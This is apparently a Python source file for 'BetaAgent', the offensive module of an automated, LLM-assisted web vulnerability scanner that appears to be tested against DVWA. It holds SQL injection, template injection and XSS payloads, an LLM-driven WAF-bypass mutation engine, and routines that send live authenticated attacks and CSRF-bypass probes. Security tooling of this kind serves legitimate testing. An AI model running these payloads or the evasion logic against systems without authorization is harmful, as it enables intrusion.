import asyncio
import hashlib
import json
import logging
import random

from backend.agents._shared import (
    ControlSignalMixin,
    ScanContextRecorderMixin,
    SkillRecallMixin,
)
from backend.ai.cortex import get_cortex_engine
from backend.core.browser_agent import BrowserEnabledAgent
from backend.core.content_boundary import content_boundary
from backend.core.exploit_engine import MultiLayerVerifier
from backend.core.hive import EventType, HiveEvent
from backend.core.payload_delivery import (
    HTTP_VECTORS,
    PayloadDeliveryEngine,
    payload_bandit,
    payload_family,
)
from backend.core.protocol import AgentID, JobPacket
from backend.core.proxy import network_interceptor

logger = logging.getLogger("AgentBeta")


class BetaAgent(SkillRecallMixin, ControlSignalMixin, ScanContextRecorderMixin, BrowserEnabledAgent):
    """
    AGENT BETA: THE BREAKER
    Role: Heavy Offensive Operations with Browser Exploitation.
    Capabilities:
    - Polyglot Payloads.
    - WAF Mutation Engine.
    - Real-time HTTP attack execution.
    - Browser-based XSS verification
    - CSRF token testing
    - DOM-based XSS detection
    - Clickjacking tests
    """

    def __init__(self, bus):
        super().__init__("agent_beta", bus)

        # CORTEX AI Integration (two-LLM policy: Gemini + OpenRouter)
        try:
            self.ai = get_cortex_engine()
        except Exception as e:
            logger.debug(f"[{self.name}] AI Engine initialization deferred: {e}")
            self.ai = None

        # SOTA: Polyglots triggering multiple parsers
        self.polyglots = [
            "javascript://%250Aalert(1)//\"/*'*/-->",  # XSS + JS
            "' OR 1=1 UNION SELECT 1,2,3--",  # SQLi
            "{{7*7}}{% debug %}",  # SSTI
        ]
        # Governance: throttle flag from Zeta
        self._throttled = False
        self._seen_payload_batches = set()

        # Real adaptive intelligence (Architecture §6, §5.2): epsilon-greedy
        # PayloadBandit over (vuln_class, vector, payload_family) + multi-vector
        # HTTP delivery. Replaces the former fake "RL" log-line behavior.
        self.bandit = payload_bandit
        self.delivery = PayloadDeliveryEngine()

        # Persistent aiohttp session to prevent socket exhaustion (same pattern
        # as Sigma's SessionLifecycleMixin). Created lazily in _get_session().
        self._session = None

        # Browser Integration inherited from BrowserEnabledAgent
        # self.browser, self.session_manager, self.forensics available via properties

    async def stop(self):
        """Gracefully close the persistent session to prevent socket leaks."""
        if self._session and not self._session.closed:
            await self._session.close()
            self._session = None
        await super().stop()

    async def setup(self):
        self.bus.subscribe(EventType.JOB_ASSIGNED, self.handle_job)
        self.bus.subscribe(EventType.VULN_CANDIDATE, self.handle_candidate)
        # Architecture §5.2 / §29.4: Beta consumes Sigma's payload shipments via
        # JOB_COMPLETED, and reacts to Zeta's runtime governor (THROTTLE/RESUME).
        # These subscribes used to be stranded after a `return` inside
        # _skill_recommendations and silently never fired — fixed.
        self.bus.subscribe(EventType.JOB_COMPLETED, self.handle_sigma_payloads)
        # Wired via the shared ControlSignalMixin so the THROTTLE/RESUME
        # behaviour stays identical across every agent that opts in.
        self.subscribe_control(self.bus)

    def _skill_recommendations(self, target_url: str, vuln_class: str) -> list:
        """Consume skill recommendations for this vuln class (Architecture §29.9:
        skills consumed by Beta). Cached per (target, class) — now backed by
        the shared ``SkillRecallMixin.recall_skills`` helper. Beta keeps the
        original limit of 5 per class."""
        return self.recall_skills(target_url=target_url, vuln_classes=[vuln_class], limit=5)

    async def handle_candidate(self, event: HiveEvent):
        # Handle polyglot injections on candidate detection
        payload = event.payload
        # ScanContext: record event for transcript causality
        # (now via the shared ScanContextRecorderMixin — same behaviour).
        self.record(event)
        url = payload.get("url")
        tag = payload.get("tag")

        # Check if this is an XSS candidate that should be tested in browser
        if tag in ["XSS", "REFLECTED_XSS", "DOM_XSS"] or "xss" in str(payload.get("type", "")).lower():
            logger.info(f"[{self.name}] XSS Candidate detected. Routing to browser-based testing...")
            await self._test_xss_browser(url, payload.get("payload", "<script>alert(1)</script>"), event.scan_id)
            return

        if tag == "API":
            logger.info(f"[{self.name}] Intercepted API Candidate: {url}. Recall Phase Initiated.")

            # RECALL tactics from Kappa (V6 Learning Loop)
            from backend.core.orchestrator import HiveOrchestrator

            kappa = HiveOrchestrator.active_agents.get("KAPPA")

            best_payload = random.choice(self.polyglots)  # Default
            if kappa:
                try:
                    results = await kappa.recall_tactics(f"Exploit for {payload.get('type', 'vulnerability')} on {url}")
                    if results:
                        best_payload = results[0].get("payload", best_payload)
                        logger.debug(f"[{self.name}] [RECALL SUCCESS] Reusing verified payload: {best_payload}")
                except Exception as e:
                    logger.warning(f"[{self.name}] [RECALL ERROR] {e}")

            mutated_polyglot = await self.waf_mutate(best_payload)
            logger.debug(f"[{self.name}] >> AI Mutation Strategy: {mutated_polyglot}")

            # FIXED: Actually execute the attack via real HTTP requests. Carry
            # any auth headers exposed in the candidate (Sigma/Orchestrator may
            # have included them so the cookie/Bearer reaches the target).
            cand_headers = payload.get("headers") or payload.get("target_headers") or {}
            await self._execute_real_attack(url, mutated_polyglot, scan_id=event.scan_id, headers=cand_headers)

    async def handle_job(self, event: HiveEvent):
        payload = event.payload
        try:
            packet = JobPacket(**payload)
        except Exception as e:
            logger.debug("[%s] Job packet parse failed: %s", self.name, e)
            return

        if packet.config.agent_id != AgentID.BETA:
            return

        # Governance: if Zeta has throttled the swarm, drop direct-assault
        # dispatch this round. Sigma still feeds us payloads via
        # handle_sigma_payloads when it's safe to fire.
        if self._throttled:
            logger.warning(
                f"[{self.name}] [THROTTLE] Direct assault on {packet.target.url} skipped under governance signal."
            )
            return

        logger.info(f"[{self.name}] Received Breaker Job {packet.id}. Executing direct assault on {packet.target.url}")

        if packet.config.module_id == "sigma_payload_handoff":
            payloads = packet.config.params.get("payloads", []) if packet.config.params else []
            await self._execute_payload_batch(
                packet.target.url, payloads, event.scan_id, base_headers=dict(packet.target.headers or {})
            )
            return

        # FIXED: Beta now executes attacks directly when receiving its own jobs
        # Execute polyglot payloads directly against the target. Crucially, we
        # thread packet.target.headers through so the seeder's auth Cookie
        # actually reaches DVWA — without this the polyglot path landed on the
        # login redirect and never tested the vulnerable endpoint.
        target_url = packet.target.url
        base_headers = dict(packet.target.headers or {})
        for polyglot in self.polyglots:
            mutated = await self.waf_mutate(polyglot)
            await self._execute_real_attack(target_url, mutated, scan_id=event.scan_id, headers=base_headers)

    async def handle_sigma_payloads(self, event: HiveEvent):
        """Intercepts Sigma's payload shipments and executes the assault."""
        if event.source != "agent_sigma":
            return
        payload = event.payload

        data = payload.get("data", {})
        if "generated_payloads" not in data:
            return

        target_url = payload.get("target_url")
        if not target_url:
            return

        # Sigma's JOB_COMPLETED carries target_url but may also carry the
        # original auth headers under "target_headers" (orchestrator threads
        # them in seeded packets). Fall back to whatever Sigma echoed.
        base_headers = dict(payload.get("target_headers") or {})

        payloads = data["generated_payloads"]
        await self._execute_payload_batch(target_url, payloads, event.scan_id, base_headers=base_headers)

    def _normalize_payloads(self, payloads) -> list[str]:
        """Keep only concrete payload strings Beta can safely execute."""
        if isinstance(payloads, (str, bytes)):
            payloads = [payloads.decode() if isinstance(payloads, bytes) else payloads]
        if not isinstance(payloads, list):
            return []

        normalized = []
        seen = set()
        for item in payloads:
            if isinstance(item, dict):
                item = item.get("payload") or item.get("value") or item.get("attack") or ""
            value = str(item).strip()
            if not value or value.startswith("[") or len(value) > 4096:
                continue
            if value in seen:
                continue
            seen.add(value)
            normalized.append(value)
        return normalized

    async def _execute_payload_batch(
        self, target_url: str, payloads, scan_id: str = None, base_headers: dict | None = None
    ):
        payloads = self._normalize_payloads(payloads)
        if not target_url or not payloads:
            return

        # Governance throttle: Zeta may have asked the swarm to slow down.
        # Halve the dispatch fan-out instead of sleeping blindly.
        if self._throttled and len(payloads) > 4:
            payloads = payloads[: max(2, len(payloads) // 2)]
            logger.warning(
                f"[{self.name}] [THROTTLE] Trimmed payload batch to {len(payloads)} under governance signal."
            )

        digest = hashlib.sha256(
            json.dumps({"target": target_url, "payloads": payloads}, sort_keys=True).encode("utf-8")
        ).hexdigest()
        batch_key = f"{scan_id or 'GLOBAL'}:{digest}"
        if batch_key in self._seen_payload_batches:
            return
        self._seen_payload_batches.add(batch_key)

        logger.info(
            f"[{self.name}] Intercepted {len(payloads)} payloads. Commencing bandit-driven multi-vector validation."
        )
        try:
            import aiohttp

            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:

                async def execute_payload_adaptive(p, index: int, scan_id=None):
                    try:
                        await self.bus.publish(
                            HiveEvent(
                                type=EventType.LIVE_ATTACK,
                                source=self.name,
                                scan_id=scan_id or "GLOBAL",
                                payload={
                                    "url": target_url,
                                    "arsenal": "Adaptive Fuzzer",
                                    "action": "Executing Payload",
                                    "payload": p[:50],
                                },
                            )
                        )
                        success = await self._deliver_and_verify(
                            session, target_url, p, scan_id=scan_id, base_headers=base_headers
                        )
                        if not success and index < 3:
                            # Mutation fallback for early payloads (WAF evasion).
                            mutated = await self.waf_mutate(p)
                            if mutated != p:
                                await self.bus.publish(
                                    HiveEvent(
                                        type=EventType.LIVE_ATTACK,
                                        source=self.name,
                                        scan_id=scan_id or "GLOBAL",
                                        payload={
                                            "url": target_url,
                                            "arsenal": "WAF Mutation",
                                            "action": "Retrying Mutated Payload",
                                            "payload": mutated[:50],
                                        },
                                    )
                                )
                                await self._deliver_and_verify(
                                    session, target_url, mutated, scan_id=scan_id, base_headers=base_headers
                                )
                    except Exception as payload_err:
                        logger.debug(f"[{self.name}] [PAYLOAD ERROR] Skipping payload: {payload_err}")

                logger.info(f"[{self.name}] Dispatching {len(payloads)} payloads concurrently across vectors...")
                await asyncio.gather(*[execute_payload_adaptive(p, i, scan_id) for i, p in enumerate(payloads)])
        except Exception as session_err:
            logger.error(f"[{self.name}] [SESSION ERROR] Failed to create HTTP session: {session_err}")

    async def _deliver_and_verify(
        self, session, target_url: str, payload_str: str, scan_id: str = None, base_headers: dict | None = None
    ) -> bool:
        """Deliver a payload across a bandit-selected HTTP vector, verify the
        result differentially, and update the bandit with the REAL outcome
        (Architecture §5.2, §6, §29.6)."""
        from datetime import datetime

        from backend.api.socket_manager import publish_request_event

        family = payload_family(payload_str)
        # Coarse vuln class from family for bandit keying.
        vuln_class = {
            "sqli": "sql_injection",
            "xss": "xss",
            "ssti": "ssti",
            "traversal": "path_traversal",
            "cmdi": "command_injection",
        }.get(family, "generic")

        # Bandit selects the most promising vector (explore/exploit).
        vector = self.bandit.select_vector(vuln_class, family, HTTP_VECTORS)

        # Consume skill recommendations for this vuln class (Architecture §29.9).
        skill_recs = self._skill_recommendations(target_url, vuln_class)
        if skill_recs:
            logger.debug(f"[{self.name}] [SKILLS] {len(skill_recs)} recommendation(s) for {vuln_class}")

        # Differential baseline.
        baseline = await self.delivery.baseline(target_url, session=session)
        results = await self.delivery.deliver(
            target_url,
            payload_str,
            vectors=[vector],
            session=session,
            action="validate",
            base_headers=base_headers or {},
        )
        if not results:
            self.bandit.update(vuln_class, vector, family, False)
            return False

        res = results[0]
        base_status = baseline.status if baseline else 200
        base_body = baseline.body if baseline else ""

        baseline_obj = {"status": base_status, "response": base_body}
        test_obj = {"status": res.status, "body": res.body}

        # Full §17 verification: baseline+test, negative control, repeatability.
        neg = await self.delivery.negative_control(
            target_url, payload_str, vector, session=session, base_headers=base_headers or {}
        )
        neg_obj = {"status": neg.status, "body": neg.body} if neg else None
        repeats = await self.delivery.repeat(
            target_url, payload_str, vector, times=2, session=session, base_headers=base_headers or {}
        )
        repeat_objs = [{"status": r.status, "body": r.body} for r in repeats]

        verdict = MultiLayerVerifier.verify_full(
            baseline_obj,
            test_obj,
            negative_control=neg_obj,
            repeats=repeat_objs,
        )
        verified = verdict["verified"]
        confidence = verdict["confidence"]
        signals = verdict["signals"]
        controls = verdict["controls_applied"]
        success = bool(verified)

        # REAL reward feeds the bandit (not a log line).
        self.bandit.update(vuln_class, vector, family, success)

        try:
            await publish_request_event(
                {
                    "timestamp": datetime.now().strftime("%H:%M:%S"),
                    "method": "POST" if vector in ("json_body", "form_body") else "GET",
                    "endpoint": target_url.split("?")[0][-30:],
                    "payload": payload_str[:25],
                    "vector": vector,
                    "status": res.status,
                    "latency": res.latency_ms,
                    "result": f"VERIFIED ({signals} signals)" if success else "OK",
                    "anomaly": success,
                },
                scan_id=scan_id,
            )
        except Exception as e:
            logger.debug(f"[{self.name}] publish_request_event failed: {e}")

        if success:
            evidence = content_boundary.wrap_http_response(res.status, {}, res.body[:4000], res.request_url)
            # Persist to DB (preserves prior exploit-logging behavior).
            try:
                vuln_id = await self.db.report_vulnerability(
                    scan_id=scan_id or "GLOBAL",
                    endpoint=target_url,
                    vuln_type=vuln_class.upper(),
                    severity="HIGH",
                    evidence={
                        "payload": payload_str,
                        "vector": vector,
                        "response_excerpt": evidence[:800],
                        "signals": signals,
                    },
                    validated_by=self.name,
                )
                if vuln_id and vuln_id != "CACHED":
                    await self.db.log_exploit_result(
                        vuln_id,
                        {
                            "payload": payload_str,
                            "vector": vector,
                            "worker_id": self.name,
                            "status": "EXPLOITED",
                            "response": evidence[:1200],
                            "time_ms": res.latency_ms,
                        },
                    )
            except Exception as db_err:
                logger.error(f"[{self.name}] DB Logging Error: {db_err}")

            await self.bus.publish(
                HiveEvent(
                    type=EventType.VULN_CANDIDATE,
                    source=self.name,
                    scan_id=scan_id or "GLOBAL",
                    payload={
                        "url": target_url,
                        "payload": payload_str,
                        "vector": vector,
                        "vuln_type": vuln_class.upper(),
                        "description": evidence[:1200],
                        "confidence": confidence,
                        "false_positive_controls": controls,
                        "negative_control_passed": verdict["negative_control_passed"],
                        "repeatable": verdict["repeatable"],
                        "evidence": (
                            f"Verification passed via '{vector}' vector. "
                            f"Signals: {signals}, confidence: {confidence}%. "
                            f"Controls: {', '.join(controls)}."
                        ),
                    },
                )
            )
            logger.info(
                f"[{self.name}] [HIT] {vuln_class} via {vector} on {target_url} "
                f"({signals} signals, controls={controls})"
            )
        return success

    async def _get_session(self):
        """Lazy-create a persistent aiohttp session to prevent socket exhaustion
        (mirrors Sigma's SessionLifecycleMixin pattern)."""
        if self._session is None or self._session.closed:
            import aiohttp

            self._session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10))
        return self._session

    async def _execute_real_attack(self, url: str, payload_str: str, scan_id: str = None, headers: dict | None = None):
        """Execute a real HTTP attack against the target with the given payload.

        ``headers`` carries the seeder's authenticated context (Cookie /
        Authorization). Without it the polyglot path landed on DVWA's login
        redirect and could never trigger the vulnerable handler.
        """
        import time
        from datetime import datetime

        from backend.api.socket_manager import publish_request_event

        outbound_headers = dict(headers or {})

        # Broadcast attack intent
        await self.bus.publish(
            HiveEvent(
                type=EventType.LIVE_ATTACK,
                source=self.name,
                scan_id=scan_id or "GLOBAL",
                payload={
                    "url": url,
                    "arsenal": "Polyglot Injector",
                    "action": "Injecting Payload",
                    "payload": payload_str[:50],
                },
            )
        )

        time.time()
        try:
            target = url + ("&" if "?" in url else "?") + f"test={payload_str}"
            session = await self._get_session()
            response = await network_interceptor.fetch(
                "GET", target, session=session, headers=outbound_headers or None, timeout=10
            )
            text = response.body
            status = response.status
            latency = response.elapsed_ms

            anomaly = False
            result = "OK"
            from backend.core.exploit_engine import MultiLayerVerifier

            base_status = 200
            base_text = ""
            try:
                base_response = await network_interceptor.fetch(
                    "GET", url.split("?")[0], session=session, headers=outbound_headers or None, timeout=5
                )
                base_status = base_response.status
                base_text = base_response.body
            except Exception as e:
                logger.debug(f"[{self.name}] Baseline fetch failed: {e}")

            verified, confidence, signals = MultiLayerVerifier.verify(
                {"status": base_status, "response": base_text}, {"status": status, "body": text}
            )

            # Strict mathematical payload verification.
            if not verified or signals < 2:
                return

            anomaly = True
            result = f"EXPLOIT VERIFIED (Signals: {signals})"

            try:
                await publish_request_event(
                    {
                        "timestamp": datetime.now().strftime("%H:%M:%S"),
                        "method": "GET",
                        "endpoint": url.split("?")[0][-30:] if len(url) > 30 else url,
                        "payload": payload_str[:25],
                        "status": status,
                        "latency": latency,
                        "result": result,
                        "anomaly": anomaly,
                    },
                    scan_id=scan_id,
                )
            except Exception as e:
                logger.debug(f"[{self.name}] publish_request_event failed: {e}")

            evidence = content_boundary.wrap_http_response(status, response.headers, text, response.url)
            await self.bus.publish(
                HiveEvent(
                    type=EventType.VULN_CANDIDATE,
                    source=self.name,
                    scan_id=scan_id or "GLOBAL",
                    payload={
                        "url": url,
                        "payload": payload_str,
                        "description": evidence[:1200],
                        "evidence": f"HTTP {status} with payload '{payload_str[:80]}' triggered anomalous response.",
                    },
                )
            )
            logger.info(f"[{self.name}] [HIT] Anomaly detected on {url}: {result}")
        except Exception as e:
            logger.error(f"[{self.name}] [ATTACK ERROR] {e}")

    async def waf_mutate(self, payload: str) -> str:
        """
        WAF Bypass Mutation Engine.
        Uses the tactical LLM (Gemini) to generate intelligent WAF evasion
        variants, falling back to deterministic mutations when offline.
        """
        if self.ai and self.ai.enabled:
            try:
                mutated = await self.ai.mutate_waf_bypass(payload)
                if mutated and mutated != payload:
                    mutated = content_boundary.sanitize_control_tokens(mutated)
                    return mutated
            except Exception as e:
                logger.debug("[%s] WAF mutation LLM fallback: %s", self.name, e)

        strategy = random.choice(["case_swap", "whitespace", "comment_split"])
        if strategy == "case_swap":
            return "".join([c.upper() if random.random() > 0.5 else c.lower() for c in payload])
        elif strategy == "whitespace":
            return payload.replace(" ", "/**/%09")
        elif strategy == "comment_split":
            return payload.replace("SELECT", "SEL/**/ECT")
        return payload

    async def _execute_packet(self, packet: JobPacket):
        """FIXED: Execute attack packet by dispatching via event bus to Sigma for arsenal execution."""
        await self.bus.publish(HiveEvent(type=EventType.JOB_ASSIGNED, source=self.name, payload=packet.model_dump()))

    # ============ BROWSER EXPLOITATION METHODS (Phase 2) ============

    async def _test_xss_browser(self, url: str, payload: str, scan_id: str):
        """Test XSS payload in real browser context with forensic evidence capture."""
        try:
            logger.debug(f"[{self.name}] Testing XSS in browser: {url} with payload: {payload[:50]}...")

            # Broadcast attack intent
            await self.bus.publish(
                HiveEvent(
                    type=EventType.LIVE_ATTACK,
                    source=self.name,
                    scan_id=scan_id,
                    payload={
                        "url": url,
                        "arsenal": "Browser XSS Tester",
                        "action": "Testing XSS in real browser",
                        "payload": payload[:50],
                    },
                )
            )

            # Test payload in browser (auto-selects OpenClaw for XSS)
            result = await self.browser.test_payload(url, payload)

            if result.get("triggered"):
                logger.info(f"[{self.name}] [XSS CONFIRMED] Payload triggered in browser!")

                # Capture forensic evidence
                screenshot_path = await self.forensics.capture_screenshot(
                    scan_id=scan_id, context=result.get("context"), engine="openclaw", label="xss_triggered"
                )

                dom_path = await self.forensics.capture_dom_snapshot(
                    scan_id=scan_id, context=result.get("context"), engine="openclaw", label="xss_dom"
                )

                # Publish verified vulnerability
                await self.bus.publish(
                    HiveEvent(
                        type=EventType.VULN_CONFIRMED,
                        source=self.name,
                        scan_id=scan_id,
                        payload={
                            "type": "XSS_BROWSER_VERIFIED",
                            "url": url,
                            "payload": payload,
                            "severity": "HIGH",
                            "evidence": f"XSS triggered in browser. Screenshot: {screenshot_path}, DOM: {dom_path}",
                            "browser_verified": True,
                        },
                    )
                )

        except Exception as e:
            logger.error(f"[{self.name}] Browser XSS test failed: {e}")

    async def _test_csrf_browser(self, url: str, scan_id: str):
        """Test CSRF token extraction and validation in browser."""
        try:
            logger.debug(f"[{self.name}] Testing CSRF protection: {url}")

            # Navigate to page and extract tokens
            result = await self.browser.extract_tokens(url)

            csrf_tokens = [t for t in result.get("tokens", []) if "csrf" in t.get("name", "").lower()]

            if csrf_tokens:
                logger.debug(f"[{self.name}] Found {len(csrf_tokens)} CSRF tokens")

                # Test if tokens are properly validated
                for token in csrf_tokens:
                    # Try request without token
                    test_result = await self._test_csrf_bypass(url, token, scan_id)

                    if test_result.get("bypassed"):
                        await self.bus.publish(
                            HiveEvent(
                                type=EventType.VULN_CONFIRMED,
                                source=self.name,
                                scan_id=scan_id,
                                payload={
                                    "type": "CSRF_BYPASS",
                                    "url": url,
                                    "severity": "HIGH",
                                    "evidence": f"CSRF token '{token['name']}' can be bypassed",
                                    "browser_verified": True,
                                },
                            )
                        )

        except Exception as e:
            logger.error(f"[{self.name}] CSRF test failed: {e}")

    async def _test_csrf_bypass(self, url: str, token: dict, scan_id: str) -> dict:
        """Attempt to bypass CSRF protection using various techniques."""
        try:
            logger.debug(f"[{self.name}] Testing CSRF bypass for token: {token.get('name')}")

            bypassed = False
            bypass_method = None

            # Technique 1: Try request without CSRF token
            try:
                import aiohttp

                async with aiohttp.ClientSession() as session:
                    # Make request without token
                    response = await network_interceptor.fetch(
                        "POST",
                        url,
                        session=session,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        timeout=10,
                    )

                    # If request succeeds (2xx status), CSRF protection is bypassed
                    if 200 <= response.status < 300:
                        bypassed = True
                        bypass_method = "missing_token"
                        logger.info(f"[{self.name}] CSRF bypass: Request succeeded without token")
            except Exception as e:
                logger.debug(f"[{self.name}] CSRF bypass missing_token failed: {e}")

            # Technique 2: Try with empty token value
            if not bypassed:
                try:
                    async with aiohttp.ClientSession() as session:
                        response = await network_interceptor.fetch(
                            "POST",
                            url,
                            session=session,
                            headers={
                                "Content-Type": "application/x-www-form-urlencoded",
                                token.get("name", "csrf_token"): "",
                            },
                            timeout=10,
                        )

                        if 200 <= response.status < 300:
                            bypassed = True
                            bypass_method = "empty_token"
                            logger.info(f"[{self.name}] CSRF bypass: Request succeeded with empty token")
                except Exception as e:
                    logger.debug(f"[{self.name}] CSRF bypass empty_token failed: {e}")

            # Technique 3: Try with wrong token value
            if not bypassed:
                try:
                    async with aiohttp.ClientSession() as session:
                        response = await network_interceptor.fetch(
                            "POST",
                            url,
                            session=session,
                            headers={
                                "Content-Type": "application/x-www-form-urlencoded",
                                token.get("name", "csrf_token"): "invalid_token_12345",
                            },
                            timeout=10,
                        )

                        if 200 <= response.status < 300:
                            bypassed = True
                            bypass_method = "invalid_token"
                            logger.info(f"[{self.name}] CSRF bypass: Request succeeded with invalid token")
                except Exception as e:
                    logger.debug(f"[{self.name}] CSRF bypass invalid_token failed: {e}")

            # Technique 4: POST without any CSRF token in the body
            if not bypassed:
                try:
                    async with aiohttp.ClientSession() as session:
                        response = await network_interceptor.fetch(
                            "POST",
                            url,
                            session=session,
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            timeout=10,
                        )

                        if 200 <= response.status < 300:
                            bypassed = True
                            bypass_method = "no_token_body"
                            logger.info(f"[{self.name}] CSRF bypass: POST succeeded with empty body (no token)")
                except Exception as e:
                    logger.debug(f"[{self.name}] CSRF bypass no_token_body failed: {e}")

            return {"bypassed": bypassed, "method": bypass_method, "token_name": token.get("name"), "url": url}

        except Exception as e:
            logger.error(f"[{self.name}] CSRF bypass test failed: {e}")
            return {"bypassed": False, "error": str(e)}

    async def _test_dom_xss(self, url: str, scan_id: str):
        """Test for DOM-based XSS vulnerabilities."""
        try:
            logger.debug(f"[{self.name}] Testing DOM-based XSS: {url}")

            # DOM XSS payloads that trigger via JavaScript
            dom_payloads = [
                "#<img src=x onerror=alert(1)>",
                "#javascript:alert(1)",
                "#<svg onload=alert(1)>",
                "?search=<img src=x onerror=alert(1)>",
            ]

            for payload in dom_payloads:
                test_url = url + payload

                result = await self.browser.navigate(test_url, stealth=False)

                if result.get("alert_detected"):
                    logger.info(f"[{self.name}] [DOM XSS CONFIRMED] Payload: {payload}")

                    # Capture evidence
                    await self.forensics.capture_screenshot(
                        scan_id=scan_id, context=result.get("context"), engine="openclaw", label="dom_xss"
                    )

                    await self.bus.publish(
                        HiveEvent(
                            type=EventType.VULN_CONFIRMED,
                            source=self.name,
                            scan_id=scan_id,
                            payload={
                                "type": "DOM_XSS",
                                "url": test_url,
                                "payload": payload,
                                "severity": "HIGH",
                                "evidence": "DOM-based XSS triggered via client-side JavaScript",
                                "browser_verified": True,
                            },
                        )
                    )
                    break

        except Exception as e:
            logger.error(f"[{self.name}] DOM XSS test failed: {e}")

    async def _test_clickjacking(self, url: str, scan_id: str):
        """Test for clickjacking vulnerabilities."""
        try:
            logger.debug(f"[{self.name}] Testing clickjacking protection: {url}")

            # Check X-Frame-Options and CSP frame-ancestors
            result = await self.browser.navigate(url, stealth=False)

            headers = result.get("headers", {})

            has_xfo = "x-frame-options" in [h.lower() for h in headers]
            has_csp_frame = any("frame-ancestors" in str(v).lower() for v in headers.values())

            if not has_xfo and not has_csp_frame:
                logger.info(f"[{self.name}] [CLICKJACKING VULNERABLE] No frame protection headers")

                await self.bus.publish(
                    HiveEvent(
                        type=EventType.VULN_CONFIRMED,
                        source=self.name,
                        scan_id=scan_id,
                        payload={
                            "type": "CLICKJACKING",
                            "url": url,
                            "severity": "MEDIUM",
                            "evidence": "Missing X-Frame-Options and CSP frame-ancestors headers",
                            "browser_verified": True,
                        },
                    )
                )

        except Exception as e:
            logger.error(f"[{self.name}] Clickjacking test failed: {e}")
